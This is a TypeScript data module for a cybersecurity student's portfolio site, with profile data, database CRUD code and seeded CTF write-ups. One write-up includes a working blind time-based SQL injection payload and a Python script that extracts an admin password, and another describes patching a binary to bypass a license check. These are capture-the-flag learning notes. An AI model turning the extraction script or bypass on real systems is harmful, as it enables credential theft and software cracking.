import fs from "fs/promises"
import path from "path"
import { neon } from "@neondatabase/serverless"

let _sql: ReturnType<typeof neon> | null = null

function getSql() {
  if (!_sql && process.env.DATABASE_URL) {
    _sql = neon(process.env.DATABASE_URL)
  }
  return _sql
}



// ---- Types ----

export type Skill = { name: string; percentage: number }

export type Education = {
  id: string
  degree: string
  institution: string
  period: string
  location: string
  details: { heading: string; items: string[]; summary: string }
}

export type Experience = {
  id: string
  role: string
  company: string
  period: string
  location: string
  details: { heading: string; items: string[]; summary: string }
}

export type Certification = {
  id: string
  title: string
  issuer: string
  date: string
  link?: string
  linkText?: string
  details: { heading: string; items: string[]; summary: string }
}

export type Achievement = {
  id: string
  title: string
  subtitle: string
  period: string
  details: { heading: string; items: string[] }
}

export interface SiteConfig {
  hero: {
    name: string
    title: string
    description: string
    cvUrl: string
    portraitUrl: string
  }
  about: {
    heading: string
    description: string
    portraitUrl: string
  }
  social: {
    linkedin: string
    github: string
    medium: string
  }
  skills: Skill[]
  education: Education[]
  experience: Experience[]
  certifications: Certification[]
  achievements: Achievement[]
}

export interface Writeup {
  id: string
  title: string
  event: string
  category: string
  date: string
  summary: string
  content: string
  tags: string[]
  createdAt: string
  updatedAt: string
}

export interface GalleryItem {
  id: string
  title: string
  description: string
  imageUrl: string
  category: string
  date: string
  createdAt: string
  updatedAt: string
}

// ---- Default Data ----

export const defaultSiteConfig: SiteConfig = {
  hero: {
    name: "Ronak Bajracharya",
    title: "Cybersecurity Professional",
    description:
      "Dynamic cybersecurity professional with hands-on experience, excelling in security assessments and vulnerability testing. Proficient in Linux and network monitoring, I thrive in collaborative environments, driving impactful research on emerging threats. Passionate about enhancing security measures.",
    cvUrl: "/mycv.pdf",
    portraitUrl: "/images/ronak-portrait.png",
  },
  about: {
    heading: "Cybersecurity Professional!",
    description:
      "Dynamic cybersecurity professional with hands-on experience, excelling in security assessments and vulnerability testing. Proficient in Linux and network monitoring, I thrive in collaborative environments, driving impactful research on emerging threats. Passionate about enhancing security measures.",
    portraitUrl: "/images/ronak-portrait.png",
  },
  social: {
    linkedin: "https://www.linkedin.com/in/ronak-bajracharya-886b48317/",
    github: "https://github.com/RonakBajracharya",
    medium: "https://cyancharley.medium.com",
  },
  skills: [
    { name: "Linux Proficiency", percentage: 95 },
    { name: "Network Monitoring", percentage: 90 },
    { name: "Digital Forensics", percentage: 90 },
    { name: "Security Assessments", percentage: 85 },
    { name: "Vulnerability Testing", percentage: 85 },
    { name: "Risk Analysis", percentage: 85 },
    { name: "Cryptography", percentage: 80 },
    { name: "Threat Research", percentage: 80 },
    { name: "VAPT Testing", percentage: 75 },
    { name: "Malware Analysis", percentage: 70 },
  ],
  education: [
    {
      id: "education-1",
      degree: "BSC.(HONS): ETHICAL HACKING AND CYBER SECURITY",
      institution: "Softwarica College of IT and E-commerce",
      period: "01/2024",
      location: "Dillibazar",
      details: {
        heading: "Key Coursework & Achievements:",
        items: [
          "Advanced Penetration Testing and Vulnerability Assessment",
          "Digital Forensics and Incident Response",
          "Cryptography and Secure Communications",
          "Network Security and Monitoring",
          "Malware Analysis and Reverse Engineering",
          "Ethical Hacking Methodologies",
        ],
        summary:
          "Focused on practical cybersecurity applications with hands-on experience in security testing, threat analysis, and defensive security measures.",
      },
    },
  ],
  experience: [
    {
      id: "experience-1",
      role: "Associate Security Research Analyst",
      company: "SecurityPal AI",
      period: "12/2024 to 06/2025",
      location: "Kathmandu",
      details: {
        heading: "Key Responsibilities:",
        items: [
          "Conducted in-depth security assessments and risk analyses to identify vulnerabilities across client environments",
          "Researched and documented emerging threats, including cloud misconfigurations",
          "Collaborated with cross-functional teams to ensure accuracy of research results",
          "Analyzed trends in cybersecurity threats and vulnerabilities",
          "Developed comprehensive security reports and recommendations",
        ],
        summary:
          "Successfully identified critical vulnerabilities in 50+ client environments, contributing to enhanced security posture and threat mitigation strategies.",
      },
    },
    {
      id: "experience-2",
      role: "Cybersecurity Intern",
      company: "Centre for Sustainable Development Studies",
      period: "08/2024 to 10/2024",
      location: "Kathmandu",
      details: {
        heading: "Key Responsibilities:",
        items: [
          "Helped in the VAPT test of websites and web applications",
          "Carried out research for automation and QA testing of web applications",
          "Assisted in monitoring network security for potential threats and vulnerabilities",
          "Participated in security awareness training sessions",
          "Documented security findings and remediation strategies",
        ],
        summary:
          "Gained practical experience in vulnerability assessment, penetration testing methodologies, and network security monitoring in a real-world environment.",
      },
    },
  ],
  certifications: [
    {
      id: "cert-1",
      title: "Certified in Cybersecurity (CC)",
      issuer: "ISC² Certification",
      date: "February 27, 2025",
      link: "https://www.credly.com/badges/b2dded5b-c577-4802-83cb-c10d10c4ab8b/public_url",
      linkText: "Link",
      details: {
        heading: "Certification Details:",
        items: [
          "Entry-level cybersecurity certification from ISC²",
          "Covers fundamental security principles and practices",
          "Validates knowledge in risk management, security controls, and incident response",
          "Demonstrates commitment to cybersecurity best practices",
        ],
        summary:
          "Security principles, risk management, network security, access controls, and security operations.",
      },
    },
    {
      id: "cert-2",
      title: "Crime Investigation and Analysis",
      issuer: "Professional Certification",
      date: "2024",
      link: "https://c4mpus.com/certificate/6493dc300c1d1c2cf49a2bb8",
      linkText: "Link",
      details: {
        heading: "Certification Details:",
        items: [
          "Specialized training in digital crime investigation techniques",
          "Evidence collection and preservation methodologies",
          "Forensic analysis of digital artifacts",
          "Legal aspects of cybercrime investigation",
        ],
        summary:
          "Digital forensics, evidence handling, crime scene analysis, and investigative procedures.",
      },
    },
  ],
  achievements: [
    {
      id: "achievement-1",
      title: "Multiple CTF Participations",
      subtitle: "Capture The Flag Competitions",
      period: "2024 - 2025",
      details: {
        heading: "CTF Events Participated:",
        items: [
          "KU CTF 2024 - Kathmandu University Capture The Flag competition",
          "INTIGRITI CTF 2024 - International cybersecurity competition",
          "L34K CTF 2025 - Advanced penetration testing challenges",
          "Multiple other regional and international CTF events",
        ],
      },
    },
    {
      id: "achievement-2",
      title: "Research Projects",
      subtitle: "Academic & Professional Research",
      period: "2024 - Present",
      details: {
        heading: "Notable Projects:",
        items: [
          "Quantum Resistant Cryptographic Measures: Researched and developed prototype cryptographic system using quantum resistant key exchange protocols",
          "Network Architecture Development: Designed secure network architecture with VPN implementation and advanced routing protocols",
          "Malware Analysis & Exploit Development: Static and dynamic malware analysis with vulnerability research and exploit development",
        ],
      },
    },
  ],
}

const defaultWriteups: Writeup[] = [
  {
    id: "1",
    title: "Web Exploitation: SQL Injection Deep Dive",
    event: "KU CTF 2024",
    category: "Web",
    date: "2024-06-15",
    summary: "Solved a challenging SQL injection challenge involving blind time-based extraction.",
    content: `## Challenge Overview

This challenge presented a login form vulnerable to SQL injection. The twist was that error messages were suppressed, requiring a blind approach.

## Methodology

### Step 1: Initial Reconnaissance
Testing basic SQL injection payloads revealed the application was not escaping single quotes, confirming the vulnerability.

### Step 2: Identifying the Injection Type
Since the application suppressed errors, I used blind time-based techniques. The payload \`' OR SLEEP(5)--\` caused a notable delay, confirming blind SQL injection.

### Step 3: Extracting the Database
I wrote a Python script using the \`requests\` library to automate the character-by-character extraction of database contents using time-based delays.

\`\`\`python
import requests
import string

chars = string.ascii_letters + string.digits + "{}_"
password = ""
for i in range(32):
    for c in chars:
        payload = f"' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{i+1},1)='{c}', SLEEP(2), 0)--"
        r = requests.post(url, data={"username": payload, "password": "x"})
        if r.elapsed.total_seconds() > 2:
            password += c
            break
    print(password)
\`\`\`

### Step 4: Flag
The extracted admin password revealed the flag: \`KUCTF{bl1nd_sql1_1s_st1ll_r3l3v4nt}\`

## Key Takeaways
- Blind SQL injection remains a critical vulnerability in modern applications
- Time-based extraction scripts should incorporate error handling for reliability
- Always test for SQL injection beyond error-based detection`,
    tags: ["SQL Injection", "Web", "Blind SQLi", "Python"],
    createdAt: "2024-06-16T00:00:00Z",
    updatedAt: "2024-06-16T00:00:00Z",
  },
  {
    id: "2",
    title: "Reverse Engineering: Binary Patching",
    event: "INTIGRITI CTF 2024",
    category: "Reverse Engineering",
    date: "2024-09-20",
    summary: "Analyzed and patched a binary to bypass license validation checks.",
    content: `## Challenge Description

A binary executable required a valid license key. The goal was to run the binary without a license key and extract the flag.

## Analysis

### Static Analysis with Ghidra

Loading the binary in Ghidra revealed a function called \`validate_key\` that returned 0 for invalid keys and 1 for valid keys.

### Dynamic Analysis

Using GDB, I set breakpoints at the \`validate_key\` call and traced the execution flow to understand the validation logic.

### Patching

I identified the conditional jump that determined success/failure:

\`\`\`
0x4012a3: test eax, eax
0x4012a5: je 0x4012b0
\`\`\`

Patching \`je\` to \`jne\` (0x75) inverted the logic, allowing any input to succeed.

### Flag

After patching and running the binary, the flag was displayed: \`INTIGRITI{p4tch1ng_15_fun}\`

## Tools Used
- Ghidra for static analysis
- GDB for dynamic debugging
- Python for automating the patching process`,
    tags: ["Reverse Engineering", "Ghidra", "GDB", "Patching"],
    createdAt: "2024-09-21T00:00:00Z",
    updatedAt: "2024-09-21T00:00:00Z",
  },
  {
    id: "3",
    title: "Forensics: Memory Dump Analysis",
    event: "L34K CTF 2025",
    category: "Forensics",
    date: "2025-02-10",
    summary: "Extracted sensitive information from a Windows memory dump using Volatility 3.",
    content: `## Scenario

A suspicious program was executed on a Windows machine. We were provided with a memory dump and asked to find what data was exfiltrated.

## Methodology

### Step 1: Profile Identification
Using Volatility 3:
\`\`\`bash
vol -f memory.dmp windows.info
\`\`\`

Identified the OS as Windows 10 21H2.

### Step 2: Process Analysis
Listed running processes:
\`\`\`bash
vol -f memory.dmp windows.pslist
\`\`\`

Identified a suspicious \`data_gatherer.exe\` process (PID 1234).

### Step 3: Process Memory Dump
\`\`\`bash
vol -f memory.dmp -o dumpdir/ windows.memmap --pid 1234 --dump
\`\`\`

### Step 4: String Extraction
\`\`\`bash
strings dumpdir/pid.1234.dmp | grep -i "flag{"
\`\`\`

## Flag

\`L34KCTF{m3m0ry_f0r3ns1cs_m4st3r}\`

## Key Insights
- Memory dumps contain rich forensic artifacts
- Volatility 3 plugins significantly simplify analysis
- Always scan process memory for suspicious data`,
    tags: ["Forensics", "Volatility", "Memory Analysis", "Windows"],
    createdAt: "2025-02-11T00:00:00Z",
    updatedAt: "2025-02-11T00:00:00Z",
  },
]

const defaultGallery: GalleryItem[] = [
  {
    id: "1",
    title: "KU CTF 2024 Team",
    description: "Our team during the Kathmandu University CTF competition.",
    imageUrl: "/images/ronak-portrait.png",
    category: "Events",
    date: "2024-06-15",
    createdAt: "2024-06-16T00:00:00Z",
    updatedAt: "2024-06-16T00:00:00Z",
  },
  {
    id: "2",
    title: "INTIGRITI CTF Certificate",
    description: "Certificate of participation in INTIGRITI CTF 2024.",
    imageUrl: "/images/hero-portrait.png",
    category: "Certifications",
    date: "2024-09-20",
    createdAt: "2024-09-21T00:00:00Z",
    updatedAt: "2024-09-21T00:00:00Z",
  },
]

// =====================================================
// Database implementation (Neon Postgres)
// =====================================================

type DbWriteup = {
  id: string
  title: string
  event: string
  category: string
  date: string
  summary: string
  content: string
  tags: string
  created_at: string
  updated_at: string
}

type DbGalleryRow = {
  id: string
  title: string
  description: string
  image_url: string
  category: string
  date: string
  created_at: string
  updated_at: string
}

async function initDatabase() {
  const sql = getSql()
  if (!sql) return

  await sql`
    CREATE TABLE IF NOT EXISTS site_config (
      id INTEGER PRIMARY KEY DEFAULT 1 CHECK (id = 1),
      config JSONB NOT NULL
    )
  `
  await sql`
    CREATE TABLE IF NOT EXISTS writeups (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      event TEXT NOT NULL,
      category TEXT NOT NULL,
      date TEXT NOT NULL,
      summary TEXT NOT NULL,
      content TEXT NOT NULL,
      tags TEXT NOT NULL DEFAULT '[]',
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `
  await sql`
    CREATE TABLE IF NOT EXISTS gallery (
      id TEXT PRIMARY KEY,
      title TEXT NOT NULL,
      description TEXT NOT NULL,
      image_url TEXT NOT NULL,
      category TEXT NOT NULL,
      date TEXT NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `

  const existing = await sql`SELECT id FROM site_config LIMIT 1` as Record<string, unknown>[]
  if (existing.length === 0) {
    await sql`INSERT INTO site_config (id, config) VALUES (1, ${JSON.stringify(defaultSiteConfig)})`
  }

  const wCount = await sql`SELECT COUNT(*)::int as count FROM writeups` as Record<string, unknown>[]
  if (wCount[0] && (wCount[0] as { count: number }).count === 0) {
    for (const w of defaultWriteups) {
      await sql`
        INSERT INTO writeups (id, title, event, category, date, summary, content, tags, created_at, updated_at)
        VALUES (${w.id}, ${w.title}, ${w.event}, ${w.category}, ${w.date}, ${w.summary}, ${w.content}, ${JSON.stringify(w.tags)}, ${w.createdAt}, ${w.updatedAt})
      `
    }
  }

  const gCount = await sql`SELECT COUNT(*)::int as count FROM gallery` as Record<string, unknown>[]
  if (gCount[0] && (gCount[0] as { count: number }).count === 0) {
    for (const g of defaultGallery) {
      await sql`
        INSERT INTO gallery (id, title, description, image_url, category, date, created_at, updated_at)
        VALUES (${g.id}, ${g.title}, ${g.description}, ${g.imageUrl}, ${g.category}, ${g.date}, ${g.createdAt}, ${g.updatedAt})
      `
    }
  }
}

// ---- File-based fallback ----

const DATA_DIR = path.join(process.cwd(), "data")
let _fsOk: boolean | null = null

async function isFsWritable(): Promise<boolean> {
  if (_fsOk !== null) return _fsOk
  try {
    await fs.mkdir(DATA_DIR, { recursive: true })
    const testFile = path.join(DATA_DIR, ".write-test")
    await fs.writeFile(testFile, "ok", "utf-8")
    await fs.unlink(testFile)
    _fsOk = true
  } catch {
    _fsOk = false
  }
  return _fsOk
}

async function readFile<T>(filename: string, fallback: T): Promise<T> {
  if (!(await isFsWritable())) return fallback
  const filePath = path.join(DATA_DIR, filename)
  try {
    const raw = await fs.readFile(filePath, "utf-8")
    return JSON.parse(raw) as T
  } catch {
    return fallback
  }
}

async function writeFile<T>(filename: string, data: T): Promise<void> {
  if (!(await isFsWritable())) return
  try {
    const filePath = path.join(DATA_DIR, filename)
    await fs.writeFile(filePath, JSON.stringify(data, null, 2), "utf-8")
  } catch {}
}

// =====================================================
// Public API
// =====================================================

// ---- Site Config ----

export async function getSiteConfig(): Promise<SiteConfig> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT config FROM site_config WHERE id = 1` as Record<string, unknown>[]
    if (rows.length > 0) return migrateConfig(rows[0].config as Record<string, unknown>)
    return defaultSiteConfig
  }
  const raw = await readFile<Record<string, unknown>>("site.json", defaultSiteConfig as unknown as Record<string, unknown>)
  return migrateConfig(raw)
}

function migrateConfig(raw: Record<string, unknown>): SiteConfig {
  if (Array.isArray(raw.skills)) {
    return raw as unknown as SiteConfig
  }
  const s = raw.skills as Record<string, Skill[]> | undefined
  const merged = [...(s?.technical || []), ...(s?.professional || [])]
  return { ...raw, skills: merged } as unknown as SiteConfig
}

export async function updateSiteConfig(config: SiteConfig): Promise<void> {
  const sql = getSql()
  if (sql) {
    await sql`UPDATE site_config SET config = ${JSON.stringify(config)} WHERE id = 1`
    return
  }
  await writeFile("site.json", config)
}

// ---- Writeups ----

export async function getWriteups(): Promise<Writeup[]> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM writeups ORDER BY created_at DESC` as Record<string, unknown>[]
    return (rows as DbWriteup[]).map((r) => ({
      id: r.id,
      title: r.title,
      event: r.event,
      category: r.category,
      date: r.date,
      summary: r.summary,
      content: r.content,
      tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }))
  }
  return readFile<Writeup[]>("writeups.json", defaultWriteups)
}

export async function getWriteupById(id: string): Promise<Writeup | null> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM writeups WHERE id = ${id}` as Record<string, unknown>[]
    if (rows.length === 0) return null
    const r = rows[0] as DbWriteup
    return {
      id: r.id,
      title: r.title,
      event: r.event,
      category: r.category,
      date: r.date,
      summary: r.summary,
      content: r.content,
      tags: typeof r.tags === "string" ? JSON.parse(r.tags) : r.tags,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }
  }
  const writeups = await getWriteups()
  return writeups.find((w) => w.id === id) || null
}

export async function createWriteup(data: Omit<Writeup, "id" | "createdAt" | "updatedAt">): Promise<Writeup> {
  const now = new Date().toISOString()
  const id = String(Date.now())
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`
      INSERT INTO writeups (id, title, event, category, date, summary, content, tags, created_at, updated_at)
      VALUES (${id}, ${data.title}, ${data.event}, ${data.category}, ${data.date}, ${data.summary}, ${data.content}, ${JSON.stringify(data.tags)}, ${now}, ${now})
    `
    return { ...data, id, tags: data.tags, createdAt: now, updatedAt: now }
  }
  const writeups = await getWriteups()
  const newWriteup: Writeup = { ...data, id, createdAt: now, updatedAt: now } as Writeup
  writeups.push(newWriteup)
  await writeFile("writeups.json", writeups)
  return newWriteup
}

export async function updateWriteup(id: string, updates: Partial<Writeup>): Promise<Writeup | null> {
  const now = new Date().toISOString()
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const existing = await getWriteupById(id)
    if (!existing) return null
    const merged = { ...existing, ...updates, updatedAt: now }
    await sql`
      UPDATE writeups SET
        title = ${merged.title}, event = ${merged.event}, category = ${merged.category},
        date = ${merged.date}, summary = ${merged.summary}, content = ${merged.content},
        tags = ${JSON.stringify(merged.tags)}, updated_at = ${now}
      WHERE id = ${id}
    `
    return merged
  }
  const writeups = await getWriteups()
  const index = writeups.findIndex((w) => w.id === id)
  if (index === -1) return null
  writeups[index] = { ...writeups[index], ...updates, id: writeups[index].id, updatedAt: now }
  await writeFile("writeups.json", writeups)
  return writeups[index]
}

export async function deleteWriteup(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`DELETE FROM writeups WHERE id = ${id}`
    return true
  }
  const writeups = await getWriteups()
  const index = writeups.findIndex((w) => w.id === id)
  if (index === -1) return false
  writeups.splice(index, 1)
  await writeFile("writeups.json", writeups)
  return true
}

// ---- Gallery ----

export async function getGallery(): Promise<GalleryItem[]> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM gallery ORDER BY created_at DESC` as Record<string, unknown>[]
    return (rows as DbGalleryRow[]).map((r) => ({
      id: r.id,
      title: r.title,
      description: r.description,
      imageUrl: r.image_url,
      category: r.category,
      date: r.date,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }))
  }
  return readFile<GalleryItem[]>("gallery.json", defaultGallery)
}

export async function getGalleryItemById(id: string): Promise<GalleryItem | null> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const rows = await sql`SELECT * FROM gallery WHERE id = ${id}` as Record<string, unknown>[]
    if (rows.length === 0) return null
    const r = rows[0] as DbGalleryRow
    return {
      id: r.id,
      title: r.title,
      description: r.description,
      imageUrl: r.image_url,
      category: r.category,
      date: r.date,
      createdAt: r.created_at,
      updatedAt: r.updated_at,
    }
  }
  const items = await getGallery()
  return items.find((i) => i.id === id) || null
}

export async function createGalleryItem(data: Omit<GalleryItem, "id" | "createdAt" | "updatedAt">): Promise<GalleryItem> {
  const now = new Date().toISOString()
  const id = String(Date.now())
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`
      INSERT INTO gallery (id, title, description, image_url, category, date, created_at, updated_at)
      VALUES (${id}, ${data.title}, ${data.description}, ${data.imageUrl}, ${data.category}, ${data.date}, ${now}, ${now})
    `
    return { ...data, id, createdAt: now, updatedAt: now }
  }
  const items = await getGallery()
  const newItem: GalleryItem = { ...data, id, createdAt: now, updatedAt: now } as GalleryItem
  items.push(newItem)
  await writeFile("gallery.json", items)
  return newItem
}

export async function updateGalleryItem(id: string, updates: Partial<GalleryItem>): Promise<GalleryItem | null> {
  const now = new Date().toISOString()
  const sql = getSql()
  if (sql) {
    await initDatabase()
    const existing = await getGalleryItemById(id)
    if (!existing) return null
    const merged = { ...existing, ...updates, updatedAt: now }
    await sql`
      UPDATE gallery SET
        title = ${merged.title}, description = ${merged.description},
        image_url = ${merged.imageUrl}, category = ${merged.category},
        date = ${merged.date}, updated_at = ${now}
      WHERE id = ${id}
    `
    return merged
  }
  const items = await getGallery()
  const index = items.findIndex((i) => i.id === id)
  if (index === -1) return null
  items[index] = { ...items[index], ...updates, id: items[index].id, updatedAt: now }
  await writeFile("gallery.json", items)
  return items[index]
}

export async function deleteGalleryItem(id: string): Promise<boolean> {
  const sql = getSql()
  if (sql) {
    await initDatabase()
    await sql`DELETE FROM gallery WHERE id = ${id}`
    return true
  }
  const items = await getGallery()
  const index = items.findIndex((i) => i.id === id)
  if (index === -1) return false
  items.splice(index, 1)
  await writeFile("gallery.json", items)
  return true
}
